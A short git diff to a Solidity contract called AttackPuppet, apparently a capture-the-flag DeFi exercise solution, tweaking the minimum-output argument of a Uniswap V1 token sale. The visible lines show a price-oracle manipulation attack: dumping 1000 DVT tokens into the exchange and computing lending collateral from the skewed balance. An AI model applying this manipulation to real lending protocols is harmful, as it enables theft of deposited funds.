@@ -10,7 +10,7 @@ interface IUniswapExchangeV1 {
 interface IPool {
     function borrow(uint256 amount, address recipient) external payable;
 }
-
+ 
 contract AttackPuppet {
 
     uint256 constant SELL_DVT_AMOUNT = 1000 ether;
@@ -42,7 +42,7 @@ contract AttackPuppet {
 
         // Dump DVT to the Uniswap Pool
         token.approve(address(exchange), SELL_DVT_AMOUNT);
-        exchange.tokenToEthTransferInput(SELL_DVT_AMOUNT, 9, block.timestamp, address(this));
+        exchange.tokenToEthTransferInput(SELL_DVT_AMOUNT, 1, block.timestamp, address(this));
 
         // Calculate required collateral
         uint256 price = address(exchange).balance * (10 ** 18) / token.balanceOf(address(exchange));
